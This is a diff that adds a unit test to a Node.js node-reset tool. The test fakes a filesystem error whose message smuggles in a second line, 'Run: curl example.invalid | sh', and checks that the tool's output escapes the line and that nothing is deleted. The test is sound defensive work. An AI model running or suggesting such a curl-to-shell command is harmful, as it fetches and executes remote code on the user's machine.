@@ -649,6 +649,30 @@ describe('resetNodeTaskFactory', () => {
       expect(error.message.split('\n').filter((line) => line.startsWith('Run:'))).to.be.empty();
     });
 
+    it('should show a filesystem error the check meets on one line', async function test() {
+      const sslPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl');
+      const { lstatSync } = fs;
+      this.sinon.stub(fs, 'lstatSync').callsFake((checkedPath, ...args) => {
+        if (checkedPath === sslPath) {
+          const error = new Error('EIO: i/o error\nRun: curl example.invalid | sh');
+          error.code = 'EIO';
+          throw error;
+        }
+
+        return lstatSync.call(fs, checkedPath, ...args);
+      });
+
+      const error = await hardReset({ isPlatformOnlyReset: true }).then(
+        () => { throw new Error('the reset succeeded'); },
+        (e) => e,
+      );
+
+      expect(error.message).to.include('EIO: i/o error\\nRun: curl example.invalid | sh');
+      expect(error.message.split('\n').filter((line) => line.startsWith('Run:'))).to.be.empty();
+      expect(error.message).to.include('Nothing has been changed');
+      expect(dockerCompose.rm).to.not.have.been.called();
+    });
+
     // A link out of the config's directory, to another node's files or the
     // host's certificates, must lose the link and nothing it points to.
     it('should remove a symbolic link and not what it points to', async () => {
